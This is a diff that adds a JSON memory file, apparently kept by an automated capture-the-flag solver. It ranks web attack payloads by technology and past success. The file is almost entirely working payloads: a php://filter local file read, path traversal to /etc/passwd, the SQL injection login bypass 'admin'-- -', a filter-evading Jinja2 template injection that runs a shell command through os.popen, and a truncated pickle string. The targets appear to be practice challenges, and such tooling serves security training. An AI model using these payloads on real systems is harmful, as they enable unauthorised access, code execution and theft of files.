@@ -1,0 +1,160 @@
+{
+  "version": "1.0",
+  "stats": {
+    "total_solved_challenges": 8,
+    "total_captured_flags": 8,
+    "successful_exploits": 13,
+    "last_learning_update": "2026-08-04 09:15:35"
+  },
+  "technologies": {
+    "flask/werkzeug": {
+      "lfi": {
+        "php_filter_b64": {
+          "weight": 2,
+          "payload": "php://filter/convert.base64-encode/resource=app.py",
+          "success_count": 1
+        },
+        "traversal_passwd": {
+          "weight": 2,
+          "payload": "../../../../../../../../etc/passwd",
+          "success_count": 1
+        }
+      },
+      "sqli": {
+        "auth_bypass": {
+          "weight": 6,
+          "payload": "admin'-- -",
+          "success_count": 5
+        }
+      },
+      "ssti": {
+        "Jinja2 Hex Underscore + Attr RCE (Zero Dots/Underscores/Brackets)": {
+          "weight": 2,
+          "payload": "{{ (lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f'))|attr('get')('os')|attr('popen')('cat /challenge/flag')|attr('read')() }}",
+          "success_count": 1
+        }
+      }
+    },
+    "python": {
+      "lfi": {
+        "php_filter_b64": {
+          "weight": 2,
+          "payload": "php://filter/convert.base64-encode/resource=app.py",
+          "success_count": 1
+        },
+        "traversal_passwd": {
+          "weight": 2,
+          "payload": "../../../../../../../../etc/passwd",
+          "success_count": 1
+        }
+      },
+      "sqli": {
+        "auth_bypass": {
+          "weight": 6,
+          "payload": "admin'-- -",
+          "success_count": 5
+        }
+      },
+      "ssti": {
+        "Jinja2 Hex Underscore + Attr RCE (Zero Dots/Underscores/Brackets)": {
+          "weight": 2,
+          "payload": "{{ (lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f'))|attr('get')('os')|attr('popen')('cat /challenge/flag')|attr('read')() }}",
+          "success_count": 1
+        }
+      }
+    },
+    "php": {
+      "deserialization": {
+        "python_pickle": {
+          "weight": 3,
+          "payload": "gASVMwAAAAAAAACMAm50lIwGc3lzdG",
+          "success_count": 2
+        }
+      }
+    },
+    "apache": {
+      "deserialization": {
+        "python_pickle": {
+          "weight": 3,
+          "payload": "gASVMwAAAAAAAACMAm50lIwGc3lzdG",
+          "success_count": 2
+        }
+      },
+      "client_crypto": {
+        "png_scrambler": {
+          "weight": 2,
+          "payload": "1625882204269635",
+          "success_count": 1
+        }
+      }
+    },
+    "nginx": {
+      "client_side_auth": {
+        "js_hardcoded_check": {
+          "weight": 3,
+          "payload": "4dm1n:sh.org",
+          "success_count": 2
+        }
+      }
+    }
+  },
+  "payload_weights": {
+    "lfi:php_filter_b64": {
+      "weight": 1,
+      "vuln_type": "lfi",
+      "name": "php_filter_b64",
+      "payload": "php://filter/convert.base64-encode/resource=app.py",
+      "success_count": 1,
+      "last_success": "2026-08-04 08:13:24"
+    },
+    "lfi:traversal_passwd": {
+      "weight": 1,
+      "vuln_type": "lfi",
+      "name": "traversal_passwd",
+      "payload": "../../../../../../../../etc/passwd",
+      "success_count": 1,
+      "last_success": "2026-08-04 08:13:24"
+    },
+    "deserialization:python_pickle": {
+      "weight": 2,
+      "vuln_type": "deserialization",
+      "name": "python_pickle",
+      "payload": "gASVMwAAAAAAAACMAm50lIwGc3lzdG",
+      "success_count": 2,
+      "last_success": "2026-08-04 08:51:30"
+    },
+    "client_crypto:png_scrambler": {
+      "weight": 1,
+      "vuln_type": "client_crypto",
+      "name": "png_scrambler",
+      "payload": "1625882204269635",
+      "success_count": 1,
+      "last_success": "2026-08-04 08:58:12"
+    },
+    "sqli:auth_bypass": {
+      "weight": 5,
+      "vuln_type": "sqli",
+      "name": "auth_bypass",
+      "payload": "admin'-- -",
+      "success_count": 5,
+      "last_success": "2026-08-04 09:09:56"
+    },
+    "ssti:Jinja2 Hex Underscore + Attr RCE (Zero Dots/Underscores/Brackets)": {
+      "weight": 1,
+      "vuln_type": "ssti",
+      "name": "Jinja2 Hex Underscore + Attr RCE (Zero Dots/Underscores/Brackets)",
+      "payload": "{{ (lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f'))|attr('get')('os')|attr('popen')('cat /challenge/flag')|attr('read')() }}",
+      "success_count": 1,
+      "last_success": "2026-08-04 09:09:49"
+    },
+    "client_side_auth:js_hardcoded_check": {
+      "weight": 2,
+      "vuln_type": "client_side_auth",
+      "name": "js_hardcoded_check",
+      "payload": "4dm1n:sh.org",
+      "success_count": 2,
+      "last_success": "2026-08-04 09:15:35"
+    }
+  },
+  "successful_chains": []
+}
